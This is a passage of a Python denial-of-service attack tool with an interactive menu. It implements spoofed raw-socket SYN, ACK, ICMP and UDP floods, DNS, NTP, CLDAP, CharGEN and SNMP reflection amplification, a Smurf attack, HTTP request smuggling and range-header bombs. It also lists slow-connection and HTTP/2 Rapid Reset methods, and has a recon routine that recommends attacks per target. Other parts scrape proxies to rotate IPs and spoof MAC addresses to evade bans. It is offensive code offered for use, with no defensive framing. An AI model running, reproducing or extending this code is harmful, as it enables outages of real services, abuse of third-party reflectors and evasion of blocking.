               f"Connection: keep-alive\r\n\r\n")
        writer.write(req.encode() + body1.encode()); await writer.drain()
        stats.add_sent(1, len(req) + len(body1))
        try: await asyncio.wait_for(reader.read(1024), timeout=3)
        except: pass
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def async_smuggle_tecl(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        body = f"GET /admin HTTP/1.1\r\nHost: {target}\r\nContent-Length: 10\r\n\r\nx=1\r\n0\r\n\r\n"
        req = (f"POST / HTTP/1.1\r\nHost: {target}\r\n"
               f"Transfer-Encoding: chunked\r\n"
               f"Content-Length: {len(body)}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Connection: keep-alive\r\n\r\n")
        writer.write(req.encode() + body.encode()); await writer.drain()
        stats.add_sent(1, len(req) + len(body))
        try: await asyncio.wait_for(reader.read(1024), timeout=3)
        except: pass
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def async_range_bomb(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=3)
        ranges = []
        for _ in range(random.randint(50, 200)):
            start = random.randint(0, 999999999)
            end = start + random.randint(1, 1000000)
            ranges.append(f"bytes={start}-{end}")
        range_header = ", ".join(ranges[:50])
        req = (f"GET {random.choice(PATHS)} HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Range: {range_header}\r\n"
               f"Connection: close\r\n\r\n")
        data = req.encode(); writer.write(data); await writer.drain()
        stats.add_sent(1, len(data))
        try: await asyncio.wait_for(reader.read(1024), timeout=2)
        except: pass
        writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

def fn_syn_flood(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    while running[0]:
        sip = rand_ip(); sp = rand_port(); seq = random.randint(0, 4294967295)
        flags = random.choice([0x02, 0x02, 0x02, 0x12, 0x02])
        th = struct.pack("!HHLLBBHHH", sp, port, seq, 0, (5 << 4), flags, 65535, 0, 0)
        chk = tcp_checksum(sip, target, th)
        th = struct.pack("!HHLLBBHHH", sp, port, seq, 0, (5 << 4), flags, 65535, chk, 0)
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535),
                         0x4000, random.choice([64, 128, 255]), socket.IPPROTO_TCP, 0,
                         socket.inet_aton(sip), socket.inet_aton(target))
        try: s.sendto(ih + th, (target, port)); stats.add_sent(1, 40)
        except: stats.add_error()
    s.close()

def fn_ack_flood(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    while running[0]:
        sip = rand_ip(); sp = rand_port()
        seq = random.randint(0, 4294967295); ack = random.randint(0, 4294967295)
        th = struct.pack("!HHLLBBHHH", sp, port, seq, ack, (5 << 4), 0x10, 65535, 0, 0)
        chk = tcp_checksum(sip, target, th)
        th = struct.pack("!HHLLBBHHH", sp, port, seq, ack, (5 << 4), 0x10, 65535, chk, 0)
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535),
                         0x4000, 64, socket.IPPROTO_TCP, 0,
                         socket.inet_aton(sip), socket.inet_aton(target))
        try: s.sendto(ih + th, (target, port)); stats.add_sent(1, 40)
        except: stats.add_error()
    s.close()

def fn_icmp_flood(target, port, running):
    try: s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError: return
    while running[0]:
        ident = random.randint(0, 65535); seq = random.randint(0, 65535)
        h = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
        d = os.urandom(random.choice([56, 512, 1024, 2048, 4096, 8192, 16384]))
        pkt = h + d
        chk = checksum(pkt)
        h = struct.pack("!BBHHH", 8, 0, chk, ident, seq); pkt = h + d
        try: s.sendto(pkt, (target, 0)); stats.add_sent(1, len(pkt))
        except: stats.add_error()
    s.close()

def fn_udp_spoof(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    while running[0]:
        sip = rand_ip(); sp = rand_port()
        p = port if port else rand_port()
        payload = os.urandom(random.choice([64, 256, 512, 1024, 2048, 4096, 8192]))
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(payload),
                         random.randint(0, 65535), 0x4000, 64, socket.IPPROTO_UDP, 0,
                         socket.inet_aton(sip), socket.inet_aton(target))
        uh = struct.pack("!HHHH", sp, p, 8 + len(payload), 0)
        try: s.sendto(ih + uh + payload, (target, p)); stats.add_sent(1, len(payload))
        except: stats.add_error()
    s.close()

def fn_dns_amplification(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    while running[0]:
        amp = random.choice(DNS_AMPLIFIERS); dom = random.choice(DNS_AMP_DOMAINS)
        qt = random.choice(["ANY", "DNSKEY", "TXT", "AAAA", "MX"])
        q, _ = build_dns_query(dom, qt); sp = rand_port()
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(q),
                         random.randint(0, 65535), 0x4000, 64, socket.IPPROTO_UDP, 0,
                         socket.inet_aton(target), socket.inet_aton(amp))
        uh = struct.pack("!HHHH", sp, 53, 8 + len(q), 0)
        try: s.sendto(ih + uh + q, (amp, 53)); stats.add_sent(1, len(q), amp=random.choice([50, 70, 100]))
        except: stats.add_error()
    s.close()

def fn_ntp_amplification(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    monlist = b"\x17\x00\x03\x2a" + b"\x00" * 4
    while running[0]:
        amp = random.choice(NTP_AMPLIFIERS)
        try: amp_ip = resolve(amp)
        except: continue
        if not amp_ip: continue
        sp = rand_port()
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(monlist),
                         random.randint(0, 65535), 0x4000, 64, socket.IPPROTO_UDP, 0,
                         socket.inet_aton(target), socket.inet_aton(amp_ip))
        uh = struct.pack("!HHHH", sp, 123, 8 + len(monlist), 0)
        try: s.sendto(ih + uh + monlist, (amp_ip, 123)); stats.add_sent(1, len(monlist), amp=556)
        except: stats.add_error()
    s.close()

def fn_cldap_amplification(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    q = (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00"
         b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
         b"\x63\x74\x63\x6c\x61\x73\x73\x30\x00")
    while running[0]:
        amp = random.choice(CLDAP_SERVERS); sp = rand_port()
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(q),
                         random.randint(0, 65535), 0x4000, 64, socket.IPPROTO_UDP, 0,
                         socket.inet_aton(target), socket.inet_aton(amp))
        uh = struct.pack("!HHHH", sp, 389, 8 + len(q), 0)
        try: s.sendto(ih + uh + q, (amp, 389)); stats.add_sent(1, len(q), amp=70)
        except: stats.add_error()
    s.close()

def fn_chargen_amplification(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    payload = b"\x00"
    while running[0]:
        amp = random.choice(CHARGEN_SERVERS); sp = rand_port()
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(payload),
                         random.randint(0, 65535), 0x4000, 64, socket.IPPROTO_UDP, 0,
                         socket.inet_aton(target), socket.inet_aton(amp))
        uh = struct.pack("!HHHH", sp, 19, 8 + len(payload), 0)
        try: s.sendto(ih + uh + payload, (amp, 19)); stats.add_sent(1, len(payload), amp=200)
        except: stats.add_error()
    s.close()

def fn_snmp_amplification(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError: return
    community = b"public"; version = b"\x02\x01\x01"
    pdu = (b"\xa5\x27\x02\x04" + struct.pack("!I", random.randint(1, 999999)) +
           b"\x02\x01\x00\x02\x01\x14\x30\x19\x30\x17\x06\x08\x2b\x06\x01\x02"
           b"\x01\x01\x01\x00\x04\x0b\x53\x6f\x6d\x65\x53\x74\x72\x69\x6e\x67")
    payload = b"\x30" + bytes([len(version + community) + len(pdu)]) + version
    payload += b"\x04" + bytes([len(community)]) + community + pdu
    while running[0]:
        amp = random.choice(["10.0.0.1", "192.168.1.1", "172.16.0.1"]); sp = rand_port()
        ih = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(payload),
                         random.randint(0, 65535), 0x4000, 64, socket.IPPROTO_UDP, 0,
                         socket.inet_aton(target), socket.inet_aton(amp))
        uh = struct.pack("!HHHH", sp, 161, 8 + len(payload), 0)
        try: s.sendto(ih + uh + payload, (amp, 161)); stats.add_sent(1, len(payload), amp=650)
        except: stats.add_error()
    s.close()

def fn_smurf(target, port, running):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except PermissionError: return
    bcasts = ["255.255.255.255", "10.255.255.255", "172.16.255.255", "192.168.255.255"]
    while running[0]:
        bcast = random.choice(bcasts)
        ident = random.randint(0, 65535); seq = random.randint(0, 65535)
        h = struct.pack("!BBHHH", 8, 0, 0, ident, seq); d = os.urandom(56); pkt = h + d
        chk = checksum(pkt)
        h = struct.pack("!BBHHH", 8, 0, chk, ident, seq); pkt = h + d
        try: s.sendto(pkt, (bcast, 0)); stats.add_sent(1, len(pkt), amp=random.choice([10, 20, 50]))
        except: stats.add_error()
    s.close()

def fn_dns_flood_direct(target, port, running):
    p = port if port else 53
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    prefixes = ["mail","api","cdn","static","app","dev","test","staging","proxy","vpn","ns1","ns2","admin","portal","secure","auth","oauth","graphql","rest","rpc"]
    domains = ["com","net","org","io","dev","co","ai","app","xyz","cloud","tech","online","store","blog","shop","news","media","games","art","design"]
    while running[0]:
        try:
            dom = f"{random.choice(prefixes)}{random.randint(0,99999)}.{random.choice(domains)}"
            q, _ = build_dns_query(dom, "A")
            s.sendto(q, (target, p)); stats.add_sent(1, len(q))
        except: stats.add_error()
    s.close()

KEEPALIVE_METHODS = [
    ("Slow Read", ka_slow_read, "Read 1 byte/5s, holds server thread indefinitely"),
    ("Slow Write", ka_slow_write, "Send POST body 1 byte/3s, server buffers forever"),
    ("TLS Renegotiation", ka_tls_renegotiation, "Force CPU-expensive TLS rehandshakes"),
    ("HTTP Pipelining", ka_http_pipelining, "200 pipelined requests per connection"),
    ("Chunked Slow", ka_chunked_slow, "Chunked body, 1 chunk per 10s"),
    ("aiohttp Siege", ka_aiohttp_siege, "Connection pool with keep-alive pooling"),
    ("Expect Continue", ka_expect_continue, "Expect: 100-continue, never send body"),
    ("WebSocket Hold", ka_websocket_hold, "Upgrade to WS, hold forever"),
    ("H2 Stream Flood", ka_h2_stream_flood, "10K HTTP/2 streams per connection"),
    ("Header Drip", ka_header_drip, "Send headers 1 char at 0.3s intervals"),
    ("Proxy Flood", ka_proxy_flood, "Route through scraped proxies, rotate IPs"),
    ("Connection Recycle", ka_connection_recycle, "Persistent keep-alive with request recycling"),
    ("Browser Simulator", ka_browser_simulator, "Mimic real browser: page then CSS/JS/images"),
    ("Chunked Bomb", ka_chunked_bomb, "Variable chunk sizes, server can't predict"),
    ("Partial Request", ka_partial_request, "Send infinite partial headers, never finish"),
]

HTTP_METHODS_LIST = [
    ("HTTP Flood", async_http_flood, "Async mass HTTP with WAF bypass headers"),
    ("HTTP POST Bomber", async_http_post_bomber, "Large POST bodies with Expect"),
    ("HTTP/2 Rapid Reset", async_http2_rapid_reset, "CVE-2023-44487 stream abuse"),
    ("Cache-Buster", async_cache_buster, "Random nonces + ETag bypass"),
    ("Header Bomb", async_header_bomb, "Massive custom headers per request"),
    ("HTTPS/TLS Flood", async_https_flood, "TLS handshake flooding"),
    ("TCP Connect Flood", async_tcp_connect, "Rapid async connect/close"),
    ("Fragmented HTTP", async_fragmented_http, "Slow fragmented delivery"),
    ("HTTP Smuggle CL-TE", async_smuggle_clte, "Request smuggling CL-TE variant"),
    ("HTTP Smuggle TE-CL", async_smuggle_tecl, "Request smuggling TE-CL variant"),
    ("Range Bomb", async_range_bomb, "50+ Range headers, server tries to process all"),
]

ROOT_METHODS_LIST = [
    ("SYN Flood", fn_syn_flood, "TCP SYN with IP spoofing + valid checksums"),
    ("ACK Flood", fn_ack_flood, "TCP ACK bypassing SYN filters"),
    ("ICMP Flood", fn_icmp_flood, "Raw ping flood, variable sizes"),
    ("UDP Spoof", fn_udp_spoof, "UDP with fake source IP"),
    ("Smurf Attack", fn_smurf, "ICMP broadcast amplification"),
    ("DNS Amplification", fn_dns_amplification, "DNS reflector 50-100x"),
    ("NTP Amplification", fn_ntp_amplification, "NTP monlist 556x"),
    ("CLDAP Amplification", fn_cldap_amplification, "CLDAP reflector 70x"),
    ("CharGEN Amp", fn_chargen_amplification, "CharGEN reflector 200x"),
    ("SNMP Amplification", fn_snmp_amplification, "SNMP GetBulk 650x"),
    ("DNS Flood Direct", fn_dns_flood_direct, "Direct DNS query flooding"),
]

def recon(target, port):
    clear(); print(BANNER)
    print(f"\n  {C.BOLD}RECON: {target}:{port}{C.RST}\n")
    print(f"  {C.DIM}Resolving...{C.RST}", end="", flush=True)
    ip = resolve(target)
    if ip: print(f" {C.G}{ip}{C.RST}")
    else: print(f" {C.R}FAILED{C.RST}"); input(f"\n  {C.DIM}Press Enter...{C.RST}"); return
    print(f"\n  {C.DIM}Scanning ports...{C.RST}\n")
    ports_to_check = [21,22,23,25,53,69,80,110,111,135,139,143,389,443,445,993,995,
                      1433,1521,2049,2375,2376,3000,3306,3389,4000,5432,5601,5900,5984,
                      6379,6443,7001,8000,8080,8081,8443,8500,8888,9000,9042,9090,9092,
                      9200,9300,9418,9999,10000,11211,15672,25565,27017,50000,50070]
    open_ports = []
    for p in ports_to_check:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
            if s.connect_ex((ip, p)) == 0:
                open_ports.append(p)
                print(f"  {C.G}[OPEN]{C.RST}  {p:>5d}/tcp")
            s.close()
        except: pass
    if not open_ports: print(f"  {C.Y}No open ports found{C.RST}")
    print(f"\n  {C.DIM}Detecting WAF...{C.RST}", end="", flush=True)
    wafs = WAFDetector.detect(ip, port)
    if wafs: print(f" {C.R}{', '.join(wafs)}{C.RST}")
    else: print(f" {C.G}No WAF detected{C.RST}")
    print(f"\n  {C.DIM}Checking HTTP...{C.RST}", end="", flush=True)
    http_ok = False; https_ok = False; server_header = "unknown"; h2_support = False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        s.connect((ip, 80 if port != 443 else port))
        s.send(f"HEAD / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n".encode())
        resp = s.recv(4096).decode(errors="ignore"); s.close()
        if any(c in resp for c in ["200","301","302","403","401"]):
            http_ok = True
            for line in resp.split("\r\n"):
                if line.lower().startswith("server:"): server_header = line.split(":",1)[1].strip()
                if line.lower().startswith("alt-svc:") and "h2" in line.lower(): h2_support = True
        print(f" {C.G}HTTP OK{C.RST} | Server: {server_header} | H2: {'yes' if h2_support else 'no'}")
    except: print(f" {C.R}HTTP FAILED{C.RST}")
    print(f"  {C.DIM}Checking HTTPS...{C.RST}", end="", flush=True)
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        ss = ctx.wrap_socket(s, server_hostname=target)
        ss.connect((ip, 443 if port == 80 else port))
        ss.send(f"HEAD / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n".encode())
        resp = ss.recv(4096).decode(errors="ignore"); ss.close()
        if any(c in resp for c in ["200","301","302","403","401"]): https_ok = True
        print(f" {C.G}HTTPS OK{C.RST}")
    except: print(f" {C.R}HTTPS FAILED{C.RST}")
    print(f"\n  {C.BOLD}RECOMMENDATIONS{C.RST}\n")
    if wafs:
        print(f"  {C.R}[!] WAF DETECTED: {', '.join(wafs)}{C.RST}")
        print(f"  {C.Y}→{C.RST} Use PROXY FLOOD to rotate IPs")
        print(f"  {C.Y}→{C.RST} Use BROWSER SIMULATOR to look legitimate")
        print(f"  {C.Y}→{C.RST} Use SLOW methods (1-5, 10, 15) — WAF can't detect slow")
        print(f"  {C.Y}→{C.RST} Avoid rapid flood methods (17-22) — WAF will rate-limit")
    else:
        print(f"  {C.G}→{C.RST} No WAF! All methods viable")
        print(f"  {C.G}→{C.RST} SIEGE MODE for maximum impact")
    if http_ok or https_ok:
        if h2_support: print(f"  {C.G}→{C.RST} H2 Stream Flood (#9) very effective")
        if https_ok: print(f"  {C.G}→{C.RST} TLS Renegotiation (#3) targets SSL CPU")
        if "nginx" in server_header.lower():
            print(f"  {C.G}→{C.RST} nginx: 1024 default connections")
            print(f"     → Slow Read + Slowloris to exhaust")
        elif "apache" in server_header.lower():
            print(f"  {C.G}→{C.RST} Apache: limited MaxRequestWorkers")
            print(f"     → Slow Write + Expect Continue to exhaust")
        elif "cloudflare" in server_header.lower():
            print(f"  {C.R}→{C.RST} Cloudflare: use slow + proxy methods only{C.RST}")
        elif "iis" in server_header.lower():
            print(f"  {C.G}→{C.RST} IIS: vulnerable to Slowloris + Expect Continue")
    for p in open_ports:
        if p == 53: print(f"  {C.G}→{C.RST} Port 53: DNS Flood / Amplification")
        elif p == 123: print(f"  {C.G}→{C.RST} Port 123: NTP Amplification (556x)")
        elif p == 389: print(f"  {C.G}→{C.RST} Port 389: CLDAP Amplification (70x)")
        elif p == 161: print(f"  {C.G}→{C.RST} Port 161: SNMP Amplification (650x)")
        elif p == 11211: print(f"  {C.R}→{C.RST} Port 11211: MEMCACHED (51000x!)")
        elif p == 19: print(f"  {C.G}→{C.RST} Port 19: CharGEN Amplification (200x)")
    print(f"\n  {C.DIM}Press Enter...{C.RST}"); input()

def show_menu():
    clear(); print(BANNER)
    root_status = f"{C.G}ROOT{C.RST}" if ROOT else f"{C.Y}NO ROOT{C.RST}"
    local_ip = get_local_ip()
    h2_stat = f"{C.G}H2{C.RST}" if H2_OK else f"{C.R}NO H2{C.RST}"
    proxy_stat = f"{C.G}{proxy_pool.count()}{C.RST}" if proxy_pool.has() else f"{C.DIM}none{C.RST}"
    ka_count = len(KEEPALIVE_METHODS); http_count = len(HTTP_METHODS_LIST)
    root_count = len(ROOT_METHODS_LIST) if ROOT else 0
    total = ka_count + http_count + root_count
    try: fd_limit = resource.getrlimit(resource.RLIMIT_NOFILE)[0]
    except: fd_limit = "n/a"
    ipv6 = BanEvader.check_ipv6()
    print(f"  {C.DIM}Status:{C.RST} {root_status}  |  {C.DIM}IP:{C.RST} {local_ip}  |  {C.DIM}IPv6:{C.RST} {'✓' if ipv6 else '✗'}")
    print(f"  {C.DIM}H2:{C.RST} {h2_stat}  |  {C.DIM}FD limit:{C.RST} {fd_limit}  |  {C.DIM}CPU:{C.RST} {CPU_COUNT}  |  {C.DIM}Proxy:{C.RST} {proxy_stat}")
    print(f"  {C.DIM}Methods:{C.RST} {total} ({ka_count} keep-alive, {http_count} http, {root_count} root)")
    print(f"  {C.DIM}{'─' * 64}{C.RST}")
    if last_result:
        print(f"  {C.G}Last:{C.RST} {last_result[:80]}")
        print(f"  {C.DIM}{'─' * 64}{C.RST}")
    print(f"\n  {C.BOLD}{C.CY}KEEP-ALIVE METHODS (hold connections, exhaust server){C.RST}\n")
    for i, (name, _, desc) in enumerate(KEEPALIVE_METHODS, 1):
        proxy_tag = f" {C.M}[P]{C.RST}" if name == "Proxy Flood" else ""
        print(f"  {C.G}[{i:2d}]{C.RST} {name:<22} {C.DIM}{desc}{C.RST}{proxy_tag}")
    print(f"\n  {C.BOLD}{C.CY}HTTP METHODS (flood, no root){C.RST}\n")
    for i, (name, _, desc) in enumerate(HTTP_METHODS_LIST, ka_count + 1):
        print(f"  {C.G}[{i:2d}]{C.RST} {name:<22} {C.DIM}{desc}{C.RST}")
    if ROOT:
        print(f"\n  {C.BOLD}{C.R}ROOT METHODS (raw + amplification){C.RST}\n")
        for i, (name, _, desc) in enumerate(ROOT_METHODS_LIST, ka_count + http_count + 1):
            print(f"  {C.R}[{i:2d}]{C.RST} {name:<22} {C.DIM}{desc}{C.RST}")
    print(f"\n  {C.BOLD}OPTIONS{C.RST}\n")
    print(f"  {C.Y}[S]{C.RST} SIEGE (all keep-alive)   {C.Y}[C]{C.RST} Combo (all methods)")
    print(f"  {C.Y}[P]{C.RST} Proxy manager           {C.Y}[B]{C.RST} Ban evader")
    print(f"  {C.Y}[R]{C.RST} Recon target            {C.Y}[H]{C.RST} History")
    print(f"  {C.Y}[I]{C.RST} System info             {C.Y}[L]{C.RST} Logs")
    print(f"  {C.R}[Q]{C.RST} Quit")
    print()

def get_target():
    print(f"\n  {C.BOLD}Target Configuration{C.RST}\n")
    raw = input_default("  Target (IP/domain): ", "127.0.0.1")
    resolved = resolve(raw)
    if not resolved: print(f"  {C.R}Failed to resolve: {raw}{C.RST}"); return None, None, None, None, False
    if resolved != raw: print(f"  {C.DIM}Resolved: {raw} -> {resolved}{C.RST}")
    port = int(input_default("  Port (default 80): ", "80"))
    duration = int(input_default("  Duration sec (default 60): ", "60"))
    default_conc = 5000
    concurrency = int(input_default(f"  Concurrency (default {default_conc}): ", str(default_conc)))
    use_proxy = False
    if proxy_pool.has():
        up = input_default("  Use proxies? (y/N): ", "n").lower()
        use_proxy = up == "y"
    print(f"\n  {C.DIM}Checking target...{C.RST}", end="", flush=True)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        s.connect((resolved, port)); s.close()
        print(f" {C.G}REACHABLE{C.RST}")
    except: print(f" {C.Y}UNREACHABLE (continuing){C.RST}")
    return resolved, port, duration, concurrency, use_proxy

def show_proxy_manager():
    clear(); print(BANNER)
    print(f"\n  {C.BOLD}PROXY MANAGER{C.RST}\n")
    print(f"  Current proxies: {proxy_pool.count()}")
    for ptype in proxy_pool.valid:
        print(f"    {ptype.upper()}: {len(proxy_pool.valid[ptype])} valid / {len(proxy_pool.proxies[ptype])} scraped")
    print(f"\n  {C.BOLD}Options{C.RST}\n")
    print(f"  [1] Scrape proxies (20 sources)")
    print(f"  [2] Validate proxies")
    print(f"  [3] Scrape + Validate")
    print(f"  [4] Clear all")
    print(f"  [0] Back\n")
    choice = input_default("  Choice: ", "0")
    if choice == "1":
        print(f"\n  {C.DIM}Scraping...{C.RST}")
        proxy_pool.scrape()
        time.sleep(15)
        print(f"  Done. {proxy_pool.count()} valid.")
        input(f"\n  {C.DIM}Press Enter...{C.RST}")
    elif choice == "2":
        if not any(proxy_pool.proxies.values()):
            print(f"\n  {C.R}No proxies scraped yet. Scrape first.{C.RST}")
            input(f"\n  {C.DIM}Press Enter...{C.RST}")
        else:
            print(f"\n  {C.DIM}Validating...{C.RST}")
            proxy_pool.validate()
            time.sleep(30)
            print(f"  Done. {proxy_pool.count()} valid.")
            input(f"\n  {C.DIM}Press Enter...{C.RST}")
    elif choice == "3":
        print(f"\n  {C.DIM}Scraping...{C.RST}")
        proxy_pool.scrape()
        time.sleep(15)
        print(f"  {C.DIM}Validating...{C.RST}")
        proxy_pool.validate()
        time.sleep(30)
        print(f"  Done. {proxy_pool.count()} valid.")
        input(f"\n  {C.DIM}Press Enter...{C.RST}")
    elif choice == "4":
        for k in proxy_pool.valid: proxy_pool.valid[k] = []
        for k in proxy_pool.proxies: proxy_pool.proxies[k] = []
        print(f"\n  {C.G}Cleared.{C.RST}")
        input(f"\n  {C.DIM}Press Enter...{C.RST}")

def show_ban_evader():
    clear(); print(BANNER)
    print(f"\n  {C.BOLD}BAN EVADER{C.RST}\n")
    print(f"  Current IP: {get_local_ip()}")
    print(f"  IPv6: {'available' if BanEvader.check_ipv6() else 'unavailable'}")
    ifaces = get_interfaces()
    print(f"  Interfaces: {ifaces}")
    print(f"\n  {C.BOLD}Options{C.RST}\n")
    print(f"  [1] Full bypass (MAC spoof + DHCP renew)")
    print(f"  [2] DHCP renew only")
    print(f"  [3] MAC spoof only")
    print(f"  [4] Check current IP")
    print(f"  [0] Back\n")
    choice = input_default("  Choice: ", "0")
    if choice == "1":
        old_ip, new_ip, success = BanEvader.full_bypass()
        print(f"\n  Old IP: {old_ip}")
        print(f"  New IP: {new_ip}")
        print(f"  Result: {'SUCCESS' if success else 'IP unchanged (ISP may bind IP)'}")
        input(f"\n  {C.DIM}Press Enter...{C.RST}")
    elif choice == "2":
        new_ip = BanEvader.dhcp_renew()
        print(f"\n  IP: {new_ip}")
        input(f"\n  {C.DIM}Press Enter...{C.RST}")
    elif choice == "3":
        iface = input_default("  Interface: ", ifaces[0] if ifaces else "wlan0")
        new_mac = BanEvader.spoof_mac(iface)
        print(f"  New MAC: {new_mac}")
        input(f"\n  {C.DIM}Press Enter...{C.RST}")
    elif choice == "4":
        print(f"\n  IPv4: {get_local_ip()}")
        print(f"  IPv6: {'available' if BanEvader.check_ipv6() else 'unavailable'}")
        input(f"\n  {C.DIM}Press Enter...{C.RST}")

def show_info():
    clear(); print(BANNER)
    print(f"\n  {C.BOLD}System Information{C.RST}\n")
    print(f"  Root:          {'Yes' if ROOT else 'No'}")
    print(f"  Local IP:      {get_local_ip()}")
    print(f"  IPv6:          {'Yes' if BanEvader.check_ipv6() else 'No'}")
    print(f"  Platform:      {sys.platform}")
    print(f"  Python:        {sys.version.split()[0]}")
    print(f"  CPU cores:     {CPU_COUNT}")
    print(f"  aiohttp:       {aiohttp.__version__}")
    print(f"  H2 library:    {'available' if H2_OK else 'missing'}")
    try:
        fd = resource.getrlimit(resource.RLIMIT_NOFILE)
        print(f"  FD limit:      {fd[0]:,} (max {fd[1]:,})")
    except: print(f"  FD limit:      n/a")
    print(f"  Proxies:       {proxy_pool.count()}")
    print(f"  Log file:      {LOG_FILE}")
    ka = len(KEEPALIVE_METHODS); hp = len(HTTP_METHODS_LIST); rp = len(ROOT_METHODS_LIST) if ROOT else 0
    print(f"  Methods:       {ka+hp+rp} ({ka} keep-alive, {hp} http, {rp} root)")
    print(f"\n  {C.BOLD}Why keep-alive works{C.RST}\n")
    print(f"  nginx default:     1,024 worker connections")
    print(f"  Apache default:     256-512 MaxRequestWorkers")
    print(f"  IIS default:        4,294,967,295 (but memory limited)")
    print(f"  → Hold 5,000+ connections = server exhausts pool")
    print(f"\n  {C.BOLD}WAF Bypass{C.RST}\n")
    print(f"  Path obfuscation:  /./ , //, /%2e/, /%2f/")
    print(f"  Header spoofing:   X-Forwarded-For, X-Real-IP, Via")
    print(f"  Request smuggling: CL-TE, TE-CL variants")
    print(f"  Browser sim:       Page → CSS → JS → images → navigate")
    print(f"  Cookie gen:        Realistic session cookies")
    print(f"\n  {C.BOLD}Amplification{C.RST}\n")
    print(f"  DNS: 50-100x  NTP: 556x  CLDAP: 70x  CharGEN: 200x")
    print(f"  SNMP: 650x  Memcached: 51000x  Smurf: 10-50x")
    print(f"\n  {C.DIM}Press Enter...{C.RST}"); input()

def show_logs():
    clear(); print(BANNER)
    print(f"\n  {C.BOLD}Last 50 log lines{C.RST}\n")
    try:
        with open(LOG_FILE, "r") as f: lines = f.readlines()
        for line in lines[-50:]: print(f"  {line.rstrip()}")
    except: print(f"  {C.R}No logs found{C.RST}")
    print(f"\n  {C.DIM}Press Enter...{C.RST}"); input()

def show_history():
    clear(); print(BANNER)
    print(f"\n  {C.BOLD}Attack History (last 20){C.RST}\n")
    if not history: print(f"  {C.DIM}No attacks yet.{C.RST}")
    else:
        for h in history[-20:]:
            amp_str = f" | AMP: {C.R}{h['amp']}x{C.RST}" if h.get("amp", 0) > 0 else ""
            print(f"  {C.DIM}{h['timestamp']}{C.RST} | {C.CY}{h['method']:<24}{C.RST} "
                  f"| {h['target']}:{h['port']} | Sent: {C.G}{h['sent']:,}{C.RST} "
                  f"| Active: {C.B}{h.get('peak_active',0):,}{C.RST} "
                  f"| PPS: {C.Y}{h['peak_pps']:,}{C.RST} | BW: {C.M}{h['peak_bw']}{C.RST}{amp_str}")
    print(f"\n  {C.DIM}Press Enter...{C.RST}"); input()

def run_attack(name, method_type, fn, target, port, duration, concurrency, use_proxy=False):
    if method_type == "async":
        loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
        try: loop.run_until_complete(execute_async(name, fn, target, port, duration, concurrency, use_proxy))
        finally: loop.close()
    else:
